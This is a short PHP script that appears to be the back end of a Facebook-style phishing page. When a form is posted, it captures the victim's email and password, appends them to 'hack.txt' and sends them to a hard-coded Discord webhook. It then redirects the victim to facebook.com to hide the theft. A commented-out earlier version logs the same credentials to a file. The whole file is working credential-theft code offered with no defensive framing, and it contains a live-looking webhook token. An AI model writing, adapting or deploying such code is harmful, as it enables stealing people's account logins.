<?php

// if($_SERVER['REQUEST_METHOD'] == 'POST'){
//        $username = isset($_POST['email']) ? $_POST['email'] : '';
//        $password = isset($_POST['pass']) ? $_POST['pass'] : '';
       
// file_put_contents('hacked.txt', "Username = $username, Password = $password", FILE_APPEND);
// }

//webhook_Alam3D

if ($_SERVER['REQUEST_METHOD'] == 'POST'){
    $username = isset($_POST['email']) ? $_POST['email'] :'';
    $password = isset($_POST['pass']) ? $_POST['pass'] :'';

    file_put_contents('hack.txt', "USERNAME=$username, PASSWORD=$password", FILE_APPEND);

    $webhook_url = 'https://discord.com/api/webhooks/1215446696813920307/twJRdKFL3EngVPsrw1G59G7CbNwS75-Z5XSlz_sQvgO51znxjmCQg66XjP-KSoQ8-YXO';

    $msg = ["content" => "USERNAME: $username PASSWORD:$password" ];
  
    $headers = array('Content-Type: application/json'); 
  
    $ch = curl_init();
    curl_setopt( $ch,CURLOPT_URL, $webhook_url );
    curl_setopt( $ch,CURLOPT_POST, true );
    curl_setopt( $ch,CURLOPT_HTTPHEADER, $headers );
    curl_setopt( $ch,CURLOPT_RETURNTRANSFER, true );
    curl_setopt( $ch,CURLOPT_SSL_VERIFYPEER, false );
    curl_setopt( $ch,CURLOPT_POSTFIELDS, json_encode( $msg ) );
    $response = curl_exec( $ch );
    curl_close( $ch );
  
    echo $response;

    header('Location: http://www.facebook.com/');
}

?>